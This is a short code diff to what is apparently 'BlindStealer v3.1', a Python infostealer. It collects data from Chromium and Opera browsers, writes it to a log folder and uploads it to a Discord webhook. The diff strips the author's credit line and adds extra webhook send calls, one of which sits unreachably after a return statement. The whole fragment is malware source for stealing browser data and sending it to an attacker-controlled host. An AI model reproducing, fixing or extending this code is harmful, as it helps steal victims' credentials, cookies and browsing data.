@@ -23,7 +23,6 @@ class Browsers:
         Chromium()
         Opera()
         Upload(self.webhook)
-        embed.set_footer(text="Blind v3.1 · Created by: readdone#1155")
         
 class Upload:
     def __init__(self, webhook: SyncWebhook):
@@ -32,6 +31,7 @@ class Upload:
         self.write_files()
         self.send()
         self.clean()
+        self.webhook.send()
     
     def write_files(self):
         os.makedirs("Log", exist_ok=True)
@@ -487,3 +487,5 @@ class Types:
 
         def __repr__(self):
             return self.__str__()
+            
+            self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
